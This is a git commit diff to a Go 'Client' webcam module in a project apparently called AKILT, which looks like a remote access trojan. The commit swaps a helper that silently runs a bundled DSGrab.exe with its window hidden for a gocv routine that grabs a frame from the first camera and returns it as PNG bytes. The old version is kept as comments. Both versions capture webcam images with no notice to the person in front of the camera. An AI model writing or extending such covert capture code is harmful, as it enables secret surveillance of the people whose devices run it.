a4a44c41dfd20e9b213e059636ff821652a39950
Xart3mis <ihavemanywaifus@protonmail.com>
2022-10-24 01:56:09 +0200

    use gocv for accessing webcam

--- Client/lib/webcam/webcam.go
+++ Client/lib/webcam/webcam.go
@@ -1,35 +1,51 @@
 package webcam
 
 import (
-	"log"
-	"os"
-	"os/exec"
-	"syscall"
-
-	"github.com/Xart3mis/AKILT/Client/lib/bundles"
+	"gocv.io/x/gocv"
 )
 
-func CaptureWebcam() []byte {
-	bundles.WriteDSGrab()
-	f, err := os.MkdirTemp("", "Pic_dir-")
+// func CaptureWebcam() []byte {
+// 	bundles.WriteDSGrab()
+// 	f, err := os.MkdirTemp("", "Pic_dir-")
+
+// 	if err != nil {
+// 		log.Println(err)
+// 	}
+
+// 	path := f + "\\Temp_Pic.jpg"
+
+// 	cmd := exec.Command("./DSGrab.exe", "-r", "80x50", path)
+// 	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+// 	cmd.Run()
+
+// 	file, err := os.OpenFile(path, os.O_RDONLY, 0644)
+// 	if err != nil {
+// 		log.Println(err)
+// 	}
+
+// 	var b []byte = make([]byte, 6000000)
+// 	file.Read(b)
+
+// 	return b
+// }
+
+func CaptureWebcam() ([]byte, error) {
+	webcam, _ := gocv.VideoCaptureDevice(0)
+	img := gocv.NewMat()
+
+	defer webcam.Close()
+	defer img.Close()
+
+	for i := 0; i < 10; i++ {
+		webcam.Read(&img)
+	}
+	webcam.Read(&img)
+
+	buf, err := gocv.IMEncode(gocv.PNGFileExt, img)
 
 	if err != nil {
-		log.Println(err)
+		return nil, err
 	}
 
-	path := f + "\\Temp_Pic.jpg"
-
-	cmd := exec.Command("./DSGrab.exe", path)
-	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
-	cmd.Run()
-
-	file, err := os.OpenFile(path, os.O_RDONLY, 0644)
-	if err != nil {
-		log.Println(err)
-	}
-
-	var b []byte = make([]byte, 6000000)
-	file.Read(b)
-
-	return b
+	return buf.GetBytes(), nil
 }
